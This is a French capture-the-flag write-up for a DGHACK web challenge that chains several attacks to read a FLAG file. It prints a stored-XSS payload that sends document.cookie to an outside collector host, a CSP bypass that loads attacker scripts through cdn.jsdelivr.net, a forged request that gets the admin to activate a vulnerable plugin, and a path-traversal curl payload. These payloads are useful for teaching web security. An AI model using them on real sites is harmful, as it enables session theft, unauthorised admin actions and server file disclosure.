# Plugin again


> Trouvez le contenu du fichier FLAG présent à la racine du serveur.

Nous avons accès à un site qui semble être une sorte de blog / BBS avec quelques utilisateurs.  

Impossible de souscrire ("Sign up disabled for now."), mais on peut ajouter des commentaires aux posts.  

## récupérer un cookie. 

Les commentaires sont sensibles aux injections JS. Par exemple ceci, entré dans un commentaire, redirige l'utilisateur vers une page sur laquelle nous pouvons faire un vol de cookie:

```
<script>window.location.replace("https://XXXXXXXXX.x.pipedream.net?c="+document.cookie.toString());</script>coucou
```

Toutefois la CSP nous en empêche et renvoie ce genre d'erreurs `Content-Security-Policy: The page’s settings blocked the loading of a resource at inline (“script-src”)`.  Or si on examine la CSP, on voit une exception sur un CDN `https://cdn.jsdelivr.net/`: 

```
<meta http-equiv="Content-Security-Policy" content="script-src https://cdn.jsdelivr.net/" />
```

Or d'[après la doc de ce site](https://www.jsdelivr.com/?docs=gh), il peut jouer le rôle de passe plat vers du code sur github. 

Si on met un script sur un dépot GH quelconque, et qu'on en fait l'injection dans un commentaire, on pourra voler les cookies des utilisateurs:


```
le commentaire:
<script src="https://cdn.jsdelivr.net/gh/un_user_github/un_deopt_github@a1b2c3d4e5/coucou.js"></script>coucou

Et le script sur le dépot GH: 
window.location.replace("https://XXXXXXXXX.x.pipedream.net?c="+document.cookie.toString());  
```

Une fois le cookie de "Johnny" récupéré, nous voici connecté en son nom. 


## Activer le plugin comprenant une faille

En lisant les commentaires, on comprend qu'un plugin, donc le code est sur GH, à été désactivé car il ouvrait une faille de sécurité. 

https://github.com/jhonnyCtfSysdream/JhonnyTemplater


Et effectivement, on tombe sur ce code qui, puisque nous controlons le contenu de `theme`, est parfait pour parcourir tout le disque du serveur: 
```
f = open("app/texts/" + theme, 'r')
```

Malheureusement, impossible d'activer le plugin en étant connecté en tant que Johnny, il faut être admin.  

J'ai tenté d'envoyer un message à l'admin, via la messagerie de l'application, avec le même code de vol de cookie que celui qui a fonctionné pour johnny.  Et ca fonctionne, j'ai donc le cookie de l'admin. Mais en substituant le cookie, cette erreur apparait : 

> Cookie not valid for that IP , please connect on localhost to be admin 

Si le code a fonctionné, c'est qu'il a été exécuté par l'admin.  Pas besoin de plus, j'ai juste à lui faire activer le plugin directement depuis son navigateur.  

```
Message : 
<script src="https://cdn.jsdelivr.net/gh/un_user_github/un_deopt_github@a1b2c3d4e5/coucou2.js"></script>coucou

Script:  
const xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost:5000/activate-plugin/1");
xhr.send();
```

Et le plugin avec la faille est activé.  

## Exploiter le plugin 

Maintenant on a le johnny templater sur la page de nouveau post: 
http://website-akwttb.inst.malicecyber.com/new-post

Un simple payload nous renvoie le flag:

```
curl 'http://website-lqptvz.inst.malicecyber.com/new-post' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Cookie: session=xxxxx' \
    --data-raw 'theme=../../../../../FLAG&submit-template=&title=&text='

    <textarea name="text" id="text" class="form-control" rows="10">The FLAG is DGHACK{WellD0ne!Bl0ggingIsS0metimeRisky}</textarea>
```




